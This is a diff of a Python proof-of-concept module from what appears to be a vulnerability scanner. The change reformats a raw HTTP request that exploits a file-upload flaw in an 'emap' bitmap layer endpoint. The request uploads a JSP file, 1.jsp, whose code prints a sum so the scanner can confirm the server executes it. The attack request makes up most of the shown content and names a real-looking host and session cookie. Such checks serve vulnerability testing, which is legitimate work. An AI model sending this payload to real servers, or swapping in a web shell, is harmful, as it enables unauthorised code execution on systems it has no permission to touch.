@@ -35,34 +35,33 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             raw="""POST /emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null} HTTP/1.1
-                Host: 4g.139hz.com
-                Content-Length: 425
-                Cache-Control: max-age=0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-                Origin: null
-                User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
-                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGcEYB5EKXKmZXB0R
-                Accept-Encoding: gzip,deflate,sdch
-                Accept-Language: zh-CN,zh;q=0.8
-                Cookie: JSESSIONID=93D9D8770B4851FA772424EC133877EC
+Host: 4g.139hz.com
+Content-Length: 425
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: null
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGcEYB5EKXKmZXB0R
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: JSESSIONID=93D9D8770B4851FA772424EC133877EC
 
-                ------WebKitFormBoundaryGcEYB5EKXKmZXB0R
-                Content-Disposition: form-data; name="upload"; filename="1.jsp"
-                Content-Type: application/octet-stream
+------WebKitFormBoundaryGcEYB5EKXKmZXB0R
+Content-Disposition: form-data; name="upload"; filename="1.jsp"
+Content-Type: application/octet-stream
 
-                <%
-                out.println(12345+54321+10000);
-                %>
-                ------WebKitFormBoundaryGcEYB5EKXKmZXB0R
-                Content-Disposition: form-data; name="desc"
+<%
+out.println(12345+54321+10000);
+%>
+------WebKitFormBoundaryGcEYB5EKXKmZXB0R
+Content-Disposition: form-data; name="desc"
 
-                
-                ------WebKitFormBoundaryGcEYB5EKXKmZXB0R
-                Content-Disposition: form-data; name="layerName"
 
-                test
-                ------WebKitFormBoundaryGcEYB5EKXKmZXB0R--
-                """
+------WebKitFormBoundaryGcEYB5EKXKmZXB0R
+Content-Disposition: form-data; name="layerName"
+
+test
+------WebKitFormBoundaryGcEYB5EKXKmZXB0R--"""
             url = arg + "/emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}"
             code2, head, res, errcode, _ = hh.http(url ,raw=raw)
             
